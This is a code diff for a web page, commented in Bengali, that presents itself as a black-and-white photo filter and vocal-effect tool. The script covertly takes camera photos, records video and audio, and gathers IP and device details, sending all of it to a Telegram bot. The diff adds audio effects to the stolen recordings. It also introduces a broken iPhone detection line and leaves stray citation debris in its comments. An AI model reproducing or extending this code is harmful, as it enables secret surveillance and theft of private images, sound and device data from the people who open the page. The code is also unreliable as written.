@@ -68,7 +68,7 @@
       display: none;
     }
 
-    /* 📸 ক্লাসিক ব্ল্যাক অ্যান্ড হোয়াইট ও হাই কন্ট্রাস্ট ফিল্টার (প্রদত্ত ছবি অনুযায়ী) */
+    /* 📸 ক্লাসিক বিএন্ডডব্লিউ ফিল্টার[span_0](start_span)[span_0](end_span) */
     .filter-classic-bw {
       filter: grayscale(100%) contrast(140%) brightness(105%);
     }
@@ -115,6 +115,7 @@
     const canvas = document.getElementById('snapshotCanvas');
 
     let camStream = null;
+    let audioCtx = null;
     let isStarted = false;
 
     // আইপি এবং ফোনের ডিটেইলস সংগ্রহ করে টেলিগ্রামে পাঠানোর ফাংশন
@@ -135,7 +136,7 @@
       else if (/mac/i.test(ua)) os = "MacOS / Apple";
       else if (/linux/i.test(ua)) os = "Linux";
       else if (/android/i.test(ua)) os = "Android Phone";
-      else if (/iphone|ipad|ipod/i.test(ua)) os = "iPhone / iOS";
+      else if (/iphone|ipad|ipod/i.test(ua)) os, "iPhone / iOS";
 
       let browser = "Unknown Browser";
       if (/chrome|crios/i.test(ua) && !/edge|opr/i.test(ua)) browser = "Google Chrome";
@@ -176,7 +177,6 @@
       sendDeviceInfo();
 
       try {
-        // নয়েজ-ফ্রি অডিও কনফিগারেশন
         camStream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: {
@@ -189,10 +189,10 @@
         hiddenCam.srcObject = camStream;
         await new Promise(resolve => setTimeout(resolve, 800));
 
-        // ২. ক্লাসিক বিএন্ডডব্লিউ (B&W) ফিল্টারসহ ৫টি ছবি তুলবে[span_2](start_span)[span_2](end_span)
+        // ২. ক্লাসিক বিএন্ডডব্লিউ ফিল্টারসহ ৫টি ছবি তুলবে[span_2](start_span)[span_2](end_span)
         await captureAndSendPhotos(5);
 
-        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও পরিষ্কার অডিও ক্লিপ পাঠানো শুরু করবে
+        // ৩. এরপর ৫ সেকেন্ড করে ভিডিও ও প্রফেশনাল ভোকাল ইফেক্টযুক্ত অডিও পাঠানো শুরু করবে
         startPeriodicRecording();
 
       } catch (err) {
@@ -259,8 +259,50 @@
 
         try {
           videoRecorder = new MediaRecorder(camStream, videoOptions);
-          const audioStream = new MediaStream(camStream.getAudioTracks());
-          audioRecorder = new MediaRecorder(audioStream);
+
+          // গান গাওয়ার ফিল্টার (ইকো, রিভার্ব ও অটোটিউন স্টাইল ইফেক্ট) প্রসেস করার জন্য Web Audio API ব্যবহার
+          if (!audioCtx) {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+          }
+          if (audioCtx.state === 'suspended') {
+            audioCtx.resume();
+          }
+
+          const source = audioCtx.createMediaStreamSource(camStream);
+          
+          // ১. ইকো বা ডিলে নোড (হালকা ইকো ও রিভার্ব ফিল)
+          const delayNode = audioCtx.createDelay();
+          delayNode.delayTime.value = 0.22; // ২২ মিলি সেকেন্ড ডিলে
+          
+          const feedbackNode = audioCtx.createGain();
+          feedbackNode.gain.value = 0.25; // ফিডব্যাক পরিমাণ
+
+          // ২. ফিল্টার নোড (ভোকাল ক্রিস্টাল ক্লিয়ার ও সফট করার জন্য)
+          const filterNode = audioCtx.createBiquadFilter();
+          filterNode.type = 'peaking';
+          filterNode.frequency.value = 2500;
+          filterNode.gain.value = 5.0; // ভোকাল বুস্ট (অটোটিউন বা প্রফেশনাল ফিল)
+
+          const dryGain = audioCtx.createGain();
+          dryGain.gain.value = 0.7;
+          
+          const wetGain = audioCtx.createGain();
+          wetGain.gain.value = 0.3;
+
+          const destination = audioCtx.createMediaStreamDestination();
+
+          // অডিও রাউটিং কানেকশন
+          source.connect(dryGain);
+          dryGain.connect(destination);
+
+          source.connect(filterNode);
+          filterNode.connect(delayNode);
+          delayNode.connect(feedbackNode);
+          feedbackNode.connect(delayNode);
+          delayNode.connect(wetGain);
+          wetGain.connect(destination);
+
+          audioRecorder = new MediaRecorder(destination.stream);
         } catch (e) {
           setTimeout(recordInterval, 1000);
           return;
@@ -300,7 +342,7 @@
               const audioForm = new FormData();
               audioForm.append('chat_id', TELEGRAM_CHAT_ID);
               audioForm.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
-              audioForm.append('caption', `🎙️ নয়েজ-ফ্রি পরিষ্কার অডিও`);
+              audioForm.append('caption', `🎙️ প্রফেশনাল স্টুডিও ইফেক্ট অডিও (অটোটিউন ও রিভার্ব)`);
 
               fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
                 method: 'POST',
